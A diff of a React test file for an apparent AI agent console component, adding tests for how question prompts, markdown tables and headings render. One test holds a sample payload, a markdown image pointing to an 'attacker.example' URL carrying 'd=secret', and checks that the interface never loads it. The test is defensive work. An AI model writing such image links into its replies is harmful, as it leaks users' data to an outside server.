@@ -40,15 +40,13 @@ describe("ConsoleTurn new step kinds", () => {
     expect(screen.getByText("ALK moved to Build")).toBeInTheDocument();
   });
 
-  it("renders error, cancelled and heartbeat steps", () => {
+  it("renders error and cancelled steps", () => {
     render(<Turn turn={builder([
       { id: "e1", kind: "error", text: "It broke" },
       { id: "c1", kind: "cancelled", text: "Stopped." },
-      { id: "h1", kind: "heartbeat" },
     ])} />);
     expect(screen.getByText("It broke")).toBeInTheDocument();
     expect(screen.getByText("Stopped.")).toBeInTheDocument();
-    expect(screen.getByText(/working autonomously/i)).toBeInTheDocument();
   });
 
   it("renders a Rebuild's opening line as a step kind it knows", () => {
@@ -97,5 +95,71 @@ describe("ConsoleTurn new step kinds", () => {
     // Resolved summary renders the answer verbatim and no Submit control.
     expect(screen.queryByRole("button", { name: "Submit" })).toBeNull();
     expect(screen.getAllByText("Strict").length).toBeGreaterThan(0);
+  });
+
+  it.each([
+    "Send it to <reservation_id> at the <front desk>?",
+    "Use _private_field or __init__ here? Also 2*3*4 and C:\\temp\\new.",
+    "# of rooms to hold back?",
+    "1. Should we keep this rule?",
+    "How should holds work?\n# of rooms per booking: 3",
+    "Rename `x` to __init__ or 2*3*4?",
+  ])("shows a plain question exactly as written: %s", (prompt) => {
+    const question = { prompt, options: [], multiSelect: false, step: 1, total: 1 };
+    const { container } = render(
+      <Turn turn={builder([{ id: "a1", kind: "ask", question, resolved: true, answerText: "Yes" }])} />,
+    );
+    expect(container.textContent).toContain(prompt);
+  });
+
+  it("never loads an image from model-written markdown", () => {
+    const text = "Done.\n\n![x](https://attacker.example/p.png?d=secret)";
+    const { container } = render(<Turn turn={builder([{ id: "n1", kind: "note", text, markdown: true }])} />);
+    expect(screen.getByText("Done.")).toBeInTheDocument();
+    expect(container.querySelector("img")).toBeNull();
+  });
+
+  it.each([
+    ["with outer pipes", "Pick one:\n\n| Rate | Refund |\n|---|---|\n| Flexible | Yes |"],
+    ["without outer pipes", "Pick one:\n\nRate | Refund\n---|:--:\nFlexible | Yes"],
+    ["with no blank line above", "Pick one:\n| Rate | Refund |\n|---|---|\n| Flexible | Yes |"],
+  ])("renders a question that is only a table: %s", (_, prompt) => {
+    const question = { prompt, options: [], multiSelect: false, step: 1, total: 1 };
+    render(<Turn turn={builder([{ id: "a1", kind: "ask", question, resolved: true, answerText: "Yes" }])} />);
+    expect(screen.getByRole("table")).toBeInTheDocument();
+    expect(screen.getByRole("cell", { name: "Flexible" })).toBeInTheDocument();
+  });
+
+  it("keeps a plain question with pipes as written", () => {
+    const prompt = "Use a | b or c?\nThe --- divider stays too.";
+    const question = { prompt, options: [], multiSelect: false, step: 1, total: 1 };
+    const { container } = render(
+      <Turn turn={builder([{ id: "a1", kind: "ask", question, resolved: true, answerText: "Yes" }])} />,
+    );
+    expect(container.querySelector("table")).toBeNull();
+    expect(container).toHaveTextContent("Use a | b or c?");
+    expect(container).toHaveTextContent("The --- divider stays too.");
+  });
+
+  it("keeps raw angle brackets inside a markdown question", () => {
+    const prompt = "Approve this?\n\n### Routing\n\n- send it to the <front desk>";
+    const question = { prompt, options: [], multiSelect: false, step: 1, total: 1 };
+    render(<Turn turn={builder([{ id: "a1", kind: "ask", question, resolved: true, answerText: "Yes" }])} />);
+    expect(screen.getByRole("listitem")).toHaveTextContent("send it to the <front desk>");
+  });
+
+  it("renders a question's markdown, both open and answered", () => {
+    const prompt = "Approve this design?\n\n### Tools\n\n- **check_availability** reads rooms";
+    const question = { prompt, options: [], multiSelect: false, step: 1, total: 1 };
+    const expectRendered = () => {
+      expect(screen.getByRole("heading", { name: "Tools" })).toBeInTheDocument();
+      expect(screen.getByRole("listitem")).toHaveTextContent("check_availability reads rooms");
+      expect(screen.queryByText(/###|\*\*/)).toBeNull();
+    };
+    const { rerender } = render(<Turn turn={builder([{ id: "a1", kind: "ask", question, onSubmit: vi.fn() }])} />);
+    expectRendered();
+
+    rerender(<Turn turn={builder([{ id: "a1", kind: "ask", question, resolved: true, answerText: "Yes" }])} />);
+    expectRendered();
   });
 });
